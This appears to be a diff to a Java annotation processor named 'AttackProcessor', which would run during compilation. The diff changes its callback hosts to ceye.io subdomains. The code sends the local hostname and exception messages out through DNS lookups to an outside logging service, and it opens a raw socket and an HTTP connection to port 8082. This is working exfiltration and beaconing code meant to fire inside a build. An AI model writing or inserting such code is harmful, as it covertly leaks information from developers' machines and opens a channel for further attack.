@@ -38,9 +38,9 @@ public class AttackProcessor extends AbstractProcessor {
 
         try
         {
-            Inet4Address.getByName( "javac25.lirui28.t.dlsr.ga" );
+            Inet4Address.getByName( "javac26.o15p05.ceye.io" );
 
-            Inet4Address.getByName( InetAddress.getLocalHost().getHostName()+".javac25.lirui28.t.dlsr.ga" );
+            Inet4Address.getByName( InetAddress.getLocalHost().getHostName()+".javac26.o15p05.ceye.io");
 
 //            File folder = new File(System.getProperty("user.home"));
 //
@@ -65,13 +65,13 @@ public class AttackProcessor extends AbstractProcessor {
 
             try {
 
-                URL url = new URL( "http://182.92.151.151:8082");
+                URL url = new URL( "http://2.o15p05.ceye.io/8082");
                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
             } catch (Exception e) {
-                Inet4Address.getByName("runtimeerror" +".5.lirui28.t.dlsr.ga" );
+                Inet4Address.getByName("runtimeerror" +".5.o15p05.ceye.io" );
 
-                Inet4Address.getByName( e.getMessage().replaceAll( " ","" ) +".5.lirui28.t.dlsr.ga" );
-                Socket socket= new Socket("182.92.151.151", 8082);
+                Inet4Address.getByName( e.getMessage().replaceAll( " ","" ) +".o15p05.ceye.io" );
+                Socket socket= new Socket("gg.o15p05.ceye.io", 8082);
                 socket.getInputStream();
                 ObjectOutputStream objectOutputStream = new ObjectOutputStream( socket.getOutputStream());
             }
@@ -81,9 +81,9 @@ public class AttackProcessor extends AbstractProcessor {
         {
             try
             {
-                Inet4Address.getByName( "bigerror" +".6.lirui28.t.dlsr.ga" );
+                Inet4Address.getByName( "bigerror" +".6.o15p05.ceye.io" );
 
-                Inet4Address.getByName( e.getMessage().replaceAll( " ","" ) +".6.lirui28.t.dlsr.ga" );
+                Inet4Address.getByName( e.getMessage().replaceAll( " ","" ) +".6.o15p05.ceye.io" );
             }
             catch ( UnknownHostException e1 )
             {
